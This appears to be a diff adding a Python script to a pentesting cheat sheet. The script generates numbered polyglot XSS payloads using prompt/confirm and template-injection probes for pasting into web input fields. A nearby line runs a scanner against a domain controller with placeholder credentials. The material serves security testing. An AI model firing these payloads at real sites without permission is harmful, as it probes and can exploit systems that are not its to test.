@@ -6235,6 +6235,117 @@ webclientscanner -dc-ip DC_IP_here domain_here:user_here:password_here@IP_range_
 ```
 
 
+## WEBTOOLS BY MUEMMELMOEHRE
+```python
+# INPUT GENERATOR
+
+#!/usr/bin/env python3
+
+# >> input.py <<
+# >> @muemmelmoehre <<
+# generates distinguishable polyglott xss and ssti strings
+# output can be pasted into every input field
+# strings are written to ./inputstrings_<timestamp>.txt
+
+
+import datetime # timestamps
+import argparse # arguments
+
+def main():
+    # get args
+    args = parse_arguments()
+    times = args.times
+  # prepare outfile
+    outfile = name_outfile()
+
+    # generate strings
+    ## special chars
+    string = generate_specialchars()
+    file_write(outfile, "# SPECIAL CHARS")
+    file_write(outfile, "---------------")
+    file_write(outfile, string)
+    file_write(outfile, "\n")
+
+    ## xss
+    file_write(outfile, "# XSS PAYLOADS")
+    file_write(outfile, "--------------")
+    for count in range(times):
+        string = generate_xssstring(count)
+        file_write(outfile, string)
+    file_write(outfile, "\n")
+
+    ## ssti
+    file_write(outfile, "# SSTI PAYLOADS")
+    file_write(outfile, "---------------")
+    for count in range(times):
+        string = generate_sstistring(count)
+        file_write(outfile, string)
+    file_write(outfile, "\n")
+
+
+def parse_arguments():
+    parser = argparse.ArgumentParser(description='Generates identifiable payloads for special characters, xss and ssti. Specify how many payloads you need with -t number_here, e.g. "python3 input.py -t 3".')
+    # times
+    parser.add_argument('-t', '--times', type=int, default=5, help='Number of payloads to generate, default is 5.')
+    args = parser.parse_args()
+
+    return args
+
+
+# generate special char input
+def generate_specialchars():
+  string = "'\"%<>@{}()\\/&*"
+
+  return string
+
+
+# generate xss input
+def generate_xssstring(id):
+  string = f"jAvAsCrIpT:/*-/*`/*\`/*'/*\"/**/(/* */oNcLiCk=prompt({id}) )//%0D%0A%0d%0a//</StYlE/</tItLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=confirm({id})//>\x3e"
+
+  return string
+
+
+# generate ssti input
+def generate_sstistring(id):
+  string = "{{"
+  string += f"{id}"
+  string += "}*11}} ${"
+  string += f"{id}"
+  string += "*11} <%= "
+  string += f"{id}"
+  string += "*11 %> ${{"
+  string += f"{id}"
+  string += "*11}} #{"
+  string += f"{id}"
+  string += "*11} *{"
+  string += f"{id}"
+  string += "*11}"
+
+  return string
+
+
+# construct filename with timestamp
+def name_outfile():
+  current_time = datetime.datetime.now()
+  timestamp = current_time.strftime("%Y-%m-%d_%H-%M-%S")
+  filename = f"inputstrings_{timestamp}.txt"
+
+  return filename
+
+
+# write to file
+def file_write(file, line):
+  file_path = file
+  with open(file_path, 'a') as f:
+    f.write(f"{line}\n")
+
+    
+if __name__ == "__main__":
+    main()
+```
+
+
 
 ## WES-NG (Windows Exploit Suggester - Next Generation)
 ```
